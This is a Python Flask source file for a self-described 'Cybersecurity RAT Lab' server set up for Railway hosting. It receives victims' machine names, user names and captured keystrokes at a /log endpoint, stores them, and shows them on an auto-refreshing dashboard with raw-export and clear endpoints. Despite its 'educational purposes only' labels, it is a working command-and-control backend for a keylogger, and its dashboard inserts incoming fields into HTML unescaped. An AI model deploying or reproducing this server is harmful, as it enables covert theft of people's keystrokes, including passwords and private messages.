from flask import Flask, request, jsonify
from flask_cors import CORS
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Store all received data
data_store = []

@app.route('/')
def home():
    """Main dashboard - shows all captured data"""
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Cybersecurity RAT Lab</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                padding: 20px;
            }
            .container { 
                max-width: 1000px; 
                margin: 0 auto;
                background: white;
                padding: 30px;
                border-radius: 15px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            }
            .header {
                text-align: center;
                margin-bottom: 30px;
                padding-bottom: 20px;
                border-bottom: 3px solid #4CAF50;
            }
            h1 { 
                color: #2c3e50;
                margin-bottom: 10px;
                font-size: 2.5em;
            }
            .subtitle {
                color: #7f8c8d;
                font-size: 1.1em;
            }
            .stats {
                display: flex;
                gap: 20px;
                margin-bottom: 30px;
            }
            .stat-box {
                flex: 1;
                background: #f8f9fa;
                padding: 20px;
                border-radius: 10px;
                text-align: center;
                box-shadow: 0 5px 15px rgba(0,0,0,0.05);
            }
            .stat-number {
                font-size: 2.5em;
                font-weight: bold;
                color: #4CAF50;
            }
            .stat-label {
                color: #666;
                margin-top: 5px;
            }
            .data-box {
                background: #f8f9fa;
                border-left: 5px solid #3498db;
                padding: 20px;
                margin: 15px 0;
                border-radius: 8px;
                transition: transform 0.2s;
            }
            .data-box:hover {
                transform: translateX(5px);
                box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            }
            .victim-name {
                color: #e74c3c;
                font-weight: bold;
                font-size: 1.2em;
                margin-bottom: 8px;
            }
            .keystrokes {
                background: #fffde7;
                padding: 15px;
                margin: 10px 0;
                border-radius: 5px;
                border: 1px solid #ffd600;
                font-family: 'Courier New', monospace;
                word-wrap: break-word;
            }
            .timestamp {
                color: #95a5a6;
                font-size: 0.9em;
                margin-top: 10px;
            }
            .no-data {
                text-align: center;
                padding: 50px;
                color: #888;
                font-size: 1.2em;
            }
            .footer {
                margin-top: 30px;
                padding-top: 20px;
                border-top: 1px solid #eee;
                text-align: center;
                color: #7f8c8d;
                font-size: 0.9em;
            }
            .nav-links a {
                color: #3498db;
                text-decoration: none;
                margin: 0 10px;
                padding: 5px 10px;
                border-radius: 4px;
                transition: background 0.2s;
            }
            .nav-links a:hover {
                background: #f0f0f0;
            }
        </style>
        <meta http-equiv="refresh" content="5">
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔐 Cybersecurity RAT Laboratory</h1>
                <p class="subtitle">Educational Data Collection Dashboard - For Academic Purposes Only</p>
            </div>
            
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-number">''' + str(len(data_store)) + '''</div>
                    <div class="stat-label">Total Entries</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">''' + str(len(set([d.get('victim', '') for d in data_store]))) + '''</div>
                    <div class="stat-label">Unique Systems</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">''' + str(sum([len(d.get('keystrokes', '')) for d in data_store])) + '''</div>
                    <div class="stat-label">Keystrokes Captured</div>
                </div>
            </div>
            
            <h2 style="margin-bottom: 20px; color: #333;">📊 Collected Data (Live Updates)</h2>
    '''
    
    if not data_store:
        html += '''
            <div class="no-data">
                <p style="font-size: 1.5em; margin-bottom: 10px;">📭 No data received yet</p>
                <p>Start your client application to send educational test data.</p>
            </div>
        '''
    else:
        # Show last 10 entries (most recent first)
        for item in reversed(data_store[-10:]):
            html += f'''
            <div class="data-box">
                <div class="victim-name">💻 {item.get("victim", "Unknown System")}</div>
                <div style="margin: 8px 0;">
                    <span style="background: #e3f2fd; padding: 3px 8px; border-radius: 4px; margin-right: 10px;">
                        🖥️ {item.get("system", "Unknown OS")}
                    </span>
                    <span style="background: #f3e5f5; padding: 3px 8px; border-radius: 4px;">
                        👤 {item.get("user", "Unknown User")}
                    </span>
                </div>
                <div class="keystrokes">⌨️ {item.get("keystrokes", "No keystrokes captured")}</div>
                <div class="timestamp">🕒 {item.get("timestamp", "Unknown time")}</div>
            </div>
            '''
    
    html += f'''
            <div class="footer">
                <div class="nav-links">
                    <a href="/test">🔄 Test Connection</a> | 
                    <a href="/raw">📄 View Raw JSON</a> | 
                    <a href="/clear">🗑️ Clear Data</a>
                </div>
                <p style="margin-top: 20px;">
                    <strong>Server Time:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
                </p>
                <p style="margin-top: 10px; font-size: 0.8em;">
                    This server is for educational purposes only. Part of Cybersecurity curriculum.
                    <br>Data auto-refreshes every 5 seconds.
                </p>
            </div>
        </div>
    </body>
    </html>
    '''
    return html

@app.route('/log', methods=['POST'])
def receive_data():
    """Receive data from client applications"""
    try:
        data = request.json
        if not data:
            return jsonify({"error": "No JSON data received"}), 400
        
        # Add reception timestamp
        data['received_at'] = datetime.now().isoformat()
        data_store.append(data)
        
        # Log to console (visible in Railway logs)
        print(f"✅ RECEIVED from {data.get('victim', 'Unknown')}")
        print(f"   Keystrokes: {data.get('keystrokes', 'None')[:50]}...")
        print(f"   Total entries now: {len(data_store)}")
        
        return jsonify({
            "status": "success",
            "message": f"Data received from {data.get('victim', 'Unknown')}",
            "total_entries": len(data_store),
            "timestamp": data['received_at']
        })
    except Exception as e:
        print(f"❌ Error processing request: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/test')
def test():
    """Test endpoint to verify server is running"""
    return jsonify({
        "status": "online",
        "service": "Cybersecurity RAT Lab Server",
        "timestamp": datetime.now().isoformat(),
        "total_entries": len(data_store),
        "port": os.environ.get("PORT", "5000"),
        "version": "1.0",
        "purpose": "Educational cybersecurity demonstration"
    })

@app.route('/raw')
def raw_data():
    """Return all received data as raw JSON"""
    return jsonify({
        "total": len(data_store),
        "data": data_store,
        "last_updated": datetime.now().isoformat()
    })

@app.route('/clear')
def clear_data():
    """Clear all stored data (for testing/reset)"""
    data_store.clear()
    print("🗑️ All data cleared")
    return jsonify({
        "status": "cleared",
        "message": "All data has been cleared",
        "timestamp": datetime.now().isoformat()
    })

@app.route('/health')
def health():
    """Health check endpoint for Railway"""
    return jsonify({"status": "healthy"})

# ===== CRITICAL FOR RAILWAY =====
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 Cybersecurity RAT Server starting on port {port}")
    print(f"📡 POST data to: /log")
    print(f"🌐 Dashboard: /")
    print(f"🔧 Test endpoint: /test")
    print(f"📊 Total entries: {len(data_store)}")
    print("=" * 50)
    app.run(host='0.0.0.0', port=port, debug=False)
